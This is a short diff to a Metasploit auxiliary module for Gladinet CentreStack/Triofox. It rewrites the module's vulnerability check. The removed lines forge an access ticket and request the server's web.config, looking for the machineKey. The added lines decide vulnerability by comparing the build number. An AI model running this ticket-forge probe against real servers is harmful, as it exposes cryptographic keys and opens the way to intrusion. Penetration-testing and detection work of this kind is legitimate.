@@ -125,25 +125,14 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'portal', 'loginpage.aspx')
-    })
-    return Exploit::CheckCode::Unknown unless res&.code == 200
-    return Exploit::CheckCode::Safe('Target does not appear to be Gladinet CentreStack/Triofox') unless gladinet?(res)
+    version = gladinet_version
+    return Exploit::CheckCode::Detected('Gladinet detected but version could not be determined') if version.nil?
 
-    test_ticket = forge_ticket("C:\\#{DEFAULT_WEB_CONFIG_PATH}")
-    test_res = send_request_cgi({
-      'method' => 'GET',
-      'uri' => normalize_uri(target_uri.path, 'storage', 'filesvr.dn'),
-      'vars_get' => { 't' => test_ticket }
-    })
+    rex_version = Rex::Version.new(version)
+    ticket_forge_vulnerable = rex_version <= Rex::Version.new('16.12.10420.56791')
+    return Exploit::CheckCode::Vulnerable("Access ticket forge vulnerability confirmed (Build #{version})") if ticket_forge_vulnerable
 
-    if test_res&.code == 200 && test_res.body.include?('<machineKey')
-      return Exploit::CheckCode::Vulnerable('Access ticket forge vulnerability confirmed')
-    end
-
-    Exploit::CheckCode::Appears('Gladinet detected but ticket forge not confirmed')
+    Exploit::CheckCode::Detected("Version #{version} detected, attempting ticket forge anyway")
   end
 
   def run
